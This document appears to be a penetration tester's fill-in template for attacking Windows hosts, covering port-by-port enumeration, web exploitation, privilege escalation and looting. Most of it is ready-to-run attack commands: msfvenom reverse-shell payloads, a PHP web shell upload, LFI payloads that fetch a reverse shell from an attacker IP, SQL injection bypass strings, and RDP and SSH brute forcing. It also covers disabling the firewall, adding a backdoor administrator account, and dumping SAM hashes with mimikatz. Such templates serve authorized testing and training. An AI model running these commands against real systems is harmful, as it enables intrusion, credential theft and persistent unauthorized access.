# Info-sheet
msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f exe -o shell.exe

- DNS-Domain name:
- Host name:
- OS:
- Server:
- Workgroup:
- Windows domain:
- Services and ports:

INSERTTCPSCAN

### Full TCP Scan

INSERTFULLTCPSCAN

### Full UDP Scan

INSERTUDPSCAN

### Vuln Scan

INSERTVULNSCAN

```
Always start with a stealthy scan to avoid closing ports.

# Syn-scan
nmap -sS INSERTIPADDRESS

# Service-version, default scripts, OS:
nmap INSERTIPADDRESS -sV -sC -O

# Scan all ports, might take a while.
nmap INSERTIPADDRESS -p-

# Scan for UDP
nmap INSERTIPADDRESS -sU
unicornscan -mU -v -I INSERTIPADDRESS

# Connect to udp if one is open
nc -u INSERTIPADDRESS 48772

# Monster scan
nmap INSERTIPADDRESS -p- -A -T4 -sC

# Vulnerability Scan
nmap --script=vuln INSERTIPADDRESS
```


### Port 21 - FTP

- Name:
- Version:
- Anonymous login:

INSERTFTPTEST

```
nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERTIPADDRESS
```

### Port 22 - SSH

- Name:
- Version:
- Protocol:
- RSA-key-fingerprint:
- Takes-password:
If you have usernames test login with username:username

INSERTSSHCONNECT

INSERTSSHBRUTE

```
hydra -I -t 5 -l username -P password ssh://INSERTIPADDRESS
nc INSERTIPADDRESS 22
```

### Port 25 - SMTP

- Name:
- Version:
- VRFY:
- EXPN:

INSERTSMTPCONNECT

```
nc -nvv INSERTIPADDRESS 25
HELO foo<cr><lf>

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 INSERTIPADDRESS
```

### Port 110 - Pop3

- Name:
- Version:

INSERTPOP3CONNECT

### Port 135 - MSRPC

Some versions are vulnerable.

INSERTRPCMAP

```
nmap INSERTIPADDRESS --script=msrpc-enum
```

Exploit:

```
msf > use exploit/windows/dcerpc/ms03_026_dcom
searchsploit 03-026

```

### Port 139/445 - SMB

INSERTSMBMAP

INSERTSAMRDUMP

```
nmap --script=smb-* INSERTIPADDRESS -p 445

enum4linux -a INSERTIPADDRESS

rpcclient -U "" INSERTIPADDRESS
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall

smbclient -L INSERTIPADDRESS
smbclient //INSERTIPADDRESS/tmp
smbclient //INSERTIPADDRESS/admin$
smbclient //INSERTIPADDRESS/c$
smbclient //INSERTIPADDRESS/ipc$
smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
smbclient //INSERTIPADDRESS/ipc$ -U john
smbclient //INSERTIPADDRESS/admin$ -U john

Log in with shell:
winexe -U username //INSERTIPADDRESS "cmd.exe" --system

```

### Port 161/162 UDP - SNMP

Look for installed programs and other ports that are opened and may have been missed

```
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS
onesixtyone -c /root/Dropbox/Wordlists/wordlist-common-snmp-community-strings.txt INSERTIPADDRESS
snmp-check INSERTIPADDRESS -c public
```

```
# Common community strings
public
private
community
```

INSERTSNMPSCAN

### Port 443 - HTTPS

INSERTSSLSCAN

```
sslscan INSERTIPADDRESS:443
```

### Port 554 - RTSP


### Port 1030/1032/1033/1038

Used by RPC to connect in domain network. Usually nothing.

### Port 1433 - MSSQL

- Version:

```
use auxiliary/scanner/mssql/mssql_ping

# Last options. Brute force.
scanner/mssql/mssql_login

# Log in to mssql
sqsh -S INSERTIPADDRESS -U sa

# Execute commands
xp_cmdshell 'date'
go
```

If you have credentials look in metasploit for other modules.

### Port 1521 - Oracle

Name:
Version:
Password protected:

```
tnscmd10g version -h INSERTIPADDRESS
tnscmd10g status -h INSERTIPADDRESS
```


### Port 2100 - Oracle XML DB

Can be accessed through ftp.
Some default passwords here: https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm
- Name:
- Version:

Default logins:

```
sys:sys
scott:tiger
```

### Port 2049 - NFS

INSERTNFSSCAN

```
showmount -e INSERTIPADDRESS

If you find anything you can mount it like this:

mount INSERTIPADDRESS:/ /tmp/NFS
mount -t INSERTIPADDRESS:/ /tmp/NFS
```

### 3306 - MySQL

- Name:
- Version:

```
mysql --host=INSERTIPADDRESS -u root -p

nmap -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 INSERTIPADDRESS -p 3306
```

### Port 3339 - Oracle web interface

- Basic info about web service (apache, nginx, IIS)
- Server:
- Scripting language:
- Apache Modules:
- IP-address:
- Domain-name address:

### Port 3389 - Remote desktop

Test logging in to see what OS is running

```
rdesktop -u guest -p guest INSERTIPADDRESS -g 94%

# Brute force
ncrack -vv --user Administrator -P /usr/share/wordlists/rockyou.txt rdp://INSERTIPADDRESS
hydra -I -t 4 -L /root/Dropbox/Wordlists/quick_hit.txt -P /root/Dropbox/Wordlists/quick_hit.txt  rdp://INSERTIPADDRESS
```


## Webservers 

### Automated Checks

INSERTWIGSCAN

### Nikto scan

INSERTNIKTOSCAN

### Directories

INSERTDIRBSCAN

Checking Directories
```
wig-git -t 100 -u INSERTIPADDRESS
gobuster -u INSERTIPADDRESS -w /usr/share/wordlists/dirb/common.txt -t 100 
```

### Robots

INSERTROBOTS


### Default/Weak login

Google documentation for default passwords and test them:

```
site:webapplication.com password
https://cirt.net/passwords
```

```
admin admin
admin password
admin <blank>
admin nameofservice
root root
root admin
root password
root nameofservice
<username if you have> password
<username if you have> admin
<username if you have> username
<username if you have> nameofservice
```
```
Step 3: 
Browse around and look for disclosed PII on site

*Place anything here
```

### Manual Checks

```
Step 1:
View Source

Step 2: 
Start Secondary Scans
```

wig-git http://INSERTIPADDRESS/path

```
# CMS checker 
cmsmap-git -t http://INSERTIPADDRESS

#Full Nikto
nikto -h http://INSERTIPADDRESS

# Nikto with squid proxy
nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444

# Get header
curl -i INSERTIPADDRESS

# Get everything
curl -i -L INSERTIPADDRESS

# Check if it is possible to upload using put
curl -v -X OPTIONS http://INSERTIPADDRESS/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php

# Check for title and all links
dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix

#To append a .pl to the end of the resolutions:
dirb http://INSERTIPADDRESS/somedirectory -X .pl

```

### WebDav

```
Try to put a shell.asp
cd /root/Dropbox/Engagements/INSERTIPADDRESS/exploit && msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f asp -o shell.asp

cadaver INSERTIPADDRESS

put /root/Dropbox/Engagements/INSERTIPADDRESS/exploit/shell.asp
If the .asp extention is not allowed, try shell.asp.txt and use the mv command

user: wampp
pass: xampp 
```

### LFI/RFI

```
# FImap
fimap -u "http://INSERTIPADDRESS/example.php" -v 3
http://kaoticcreations.blogspot.com/2011/08/automated-lfirfi-scanning-exploiting.html

# Checks
http://INSERTIPADDRESS/?page=../../../../windows/system32/drivers/etc/hosts
http://INSERTIPADDRESS/?page=../../../../windows/system32/drivers/etc/hosts%00
http://INSERTIPADDRESS/?page=%2f..%2f..%2fwindows/system32/drivers/etc/hosts
http://INSERTIPADDRESS/?page=%2f..%2f..%2fwindows/system32/drivers/etc/hosts%00

http://INSERTIPADDRESS/?page=expect://dir
*If you get a warning include() error it is not affected
Else for shell:
POST this with tamper data to http://INSERTIPADDRESS/gallery.php?page=expect://dir
<? system('wget http://10.11.0.150/php-reverse-shell.php -O /inetpub/wwwroot/shell.php');?>
Then navigate to
http://INSERTIPADDRESS/shell.php

http://INSERTIPADDRESS/index.php?page=php://filter/convert.base64-encode/resource=../../../../windows/system32/drivers/etc/hosts
base64 -d output of above

# Bypass extension
python -m SimpleHTTPServer 80
http://INSERTIPADDRESS/page=http://10.11.0.150/shell.txt%00
http://INSERTIPADDRESS/page=http://10.11.0.150/shell.txt?

# Shell Creation

msfvenom -p php/download_exec URL=http://MYIPADDRESS/shell.exe -f raw -o shell.php
msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f exe > shell.exe
python -m SimpleHTTPServer 80

nc -nvlp 443
```


### SQL-Injection

```
# Login Bypass Checks
Username/Password: 
1' or '1'='1 
1' or 1=1 LIMIT 1;# 
'or 1=1/*
'or '1'='1' --
'or '1'='1' ({
'or '1'='1' /*

# Post
./sqlmap.py -r search-test.txt -p tfUPass

# Get
sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
```

### Sql-login-bypass

```
- Open Burp-suite
- Make and intercept request
- Send to intruder
- Cluster attack
- Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
- Attack
- Check for response length variation
```

### Password brute force - last resort

```
cewl http://INSERTIPADDRESS
```

## Vulnerability analysis

Now we have gathered information about the system. Now comes the part where we look for exploits and vulnerabilities and features.

### To try - List of possibilities
Add possible exploits here:


### Find sploits - Searchsploit and google

Where there are many exploits for a software, use google. It will automatically sort it by popularity.

```
site:exploit-db.com apache 2.4.7

# Remove dos-exploits

searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"

# Only search the title (exclude the path), add the -t
searchsploit -t Apache | grep -v '/dos/'
```


----------------------------------------------------------------------------






-----------------------------------------------------------------------------
# Privesc

### First Steps
```
Upload files
Host:
cd /root/Dropbox/Scripts/Post_Windows/uploads && python -m SimpleHTTPServer 8080

Target:
cd %temp%

echo strUrl = WScript.Arguments.Item(0) > wget.vbs && echo StrFile = WScript.Arguments.Item(1) >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs && echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs && echo Err.Clear >> wget.vbs && echo Set http = Nothing >> wget.vbs && echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs && echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs && echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs && echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs && echo http.Open "GET", strURL, False >> wget.vbs && echo http.Send >> wget.vbs && echo varByteArray = http.ResponseBody >> wget.vbs && echo Set http = Nothing >> wget.vbs && echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs && echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs && echo strData = "" >> wget.vbs && echo strBuffer = "" >> wget.vbs && echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs && echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs && echo Next >> wget.vbs && echo ts.Close >> wget.vbs

cscript.exe wget.vbs http://MYIPADDRESS:8080/wget.exe wget.exe

wget.exe http://MYIPADDRESS:8080/ -r && move MYIPADDRESS+8080 exploits && cd exploits && del index.html

START /B windows-privesc-check2.exe --audit -a -o wpc-report && START /B accesschk.exe -uwcqv "Authenticated Users" * /accepteula

Windows XP and Server 2003:
Host:
atftpd --daemon --port 69 /root/Dropbox/Scripts/Post_Windows/uploads
Target:
tftp -i INSERTIPADDRESS GET wget.exe

***If Windows 7 and above***

Empire:
python /opt/Empire/empire
listeners
uselistener http
set Name INSERTIPADDRESS
set Host http://MYIPADDRESS:8080
execute

launcher powershell INSERTIPADDRESS

Once you get a connection
agents
interact <agent_name>
usemodule privesc/powerup/allchecks
set Agent <agent_name>
execute 
***Let run for a few minutes

If you get creds:
nc -lvnp 6666
psexec -u alice -p aliceishere -c "nc.exe" MYIPADDRESS 6666 -e cmd 

Else:
bypassuac INSERTIPADDRESS

usemodule privesc/bypassuac_wscript
set Listener INSERTIPADDRESS
execute

```
### Basic info

**Users:**
```
net users
```



**Localgroups:**
```
net localgroup administrators
```



***Firewall***
```
netsh firewall show state
netsh firewall show config
```

### Set path
```
set PATH=%PATH%;C:\xampp\php
```
### Kernel exploits
```
systeminfo
```
***Paste Output***

```
Host:
cd /root/Dropbox/Engagements/INSERTIPADDRESS/privesc/ && touch sysinfo && nano sysinfo
```

***Paste Output***

```
python ~/Dropbox/Scripts/Post_Windows/windows-exp-suggester/check_exploits.py --database ~/Dropbox/Scripts/Post_Windows/windows-exp-suggester/2017-12-20-mssb.xls --systeminfo /root/Dropbox/Engagements/INSERTIPADDRESS/privesc/sysinfo | grep -v Internet
```

***Paste Output***

```
# Look for hotfixes

wmic qfe get Caption,Description,HotFixID,InstalledOn

# Search for exploits
https://github.com/SecWiki/windows-kernel-exploits
site:exploit-db.com windows XX XX
```


### Cleartext passwords

```
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```


### Reconfigure service parameters

- Unquoted service paths

Check book for instructions

- Weak service permissions

Check book for instructions

### Inside service

Check netstat to see what ports are open from outside and from inside. Look for ports only available on the inside.

```
netstat /a
netstat -ano
```

### Programs running as root/system



### Installed software

```
# Metasploit
ps

tasklist /SVC
net start
reg query HKEY_LOCAL_MACHINE\SOFTWARE
DRIVERQUERY

Look in:
C:\Program files
C:\Program files (x86)
Home directory of the user
```


### Scheduled tasks

```
schtasks /query /fo LIST /v

Check this file:
c:\WINDOWS\SchedLgU.Txt
```

### Weak passwords

Remote desktop

```
ncrack -vv --user george -P /usr/share/wordlists/rockyou.txt rdp://INSERTIPADDRESS
```

### Useful commands
**Firewall**

```
Turn firewall off
netsh firewall set opmode disable
netsh advfirewall set allprofiles state off
netsh advfirewall set currentprofile state off

```

**Add user and enable RDP**

```
net user haxxor Haxxor123 /add
net localgroup Administrators haxxor /add
net localgroup "Remote Desktop Users" haxxor /ADD

Turn firewall off
netsh firewall set opmode disable
netsh advfirewall set allprofiles state off
netsh advfirewall set currentprofile state off

# Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

Or like this
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

If you get this error:

"ERROR: CredSSP: Initialize failed, do you have correct kerberos tgt initialized ?
Failed to connect, CredSSP required by server.""

Add this reg key:

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```



------------------------------------------------------------------------




----------------------------- LOOT LOOT LOOT LOOT -------------------




------------------------------------------------------------------------


## Loot

- Proof:
- Network secret:
- Password and hashes:
- Dualhomed:
- Tcpdump:
- Interesting files:
- Databases:
- SSH-keys:
- Browser:

### Proof

### Network secret

### Passwords and hashes

```
wce32.exe -w
wce64.exe -w
fgdump.exe

reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system

# Meterpreter
hashdump
load mimikatz
msv
```

### Dualhomed

```
ipconfig /all
route print

# What other machines have been connected
arp -a
```

### Tcpdump

```
# Meterpreter
run packetrecorder -li
run packetrecorder -i 1
```

### Interesting files

```
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql

# How to cat files in meterpreter
cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt

# Recursive search
dir /s
```

### Mail

### Browser

- Browser start-page:
- Browser-history:
- Saved passwords:

### Databases

### SSH-keys

## How to replicate:
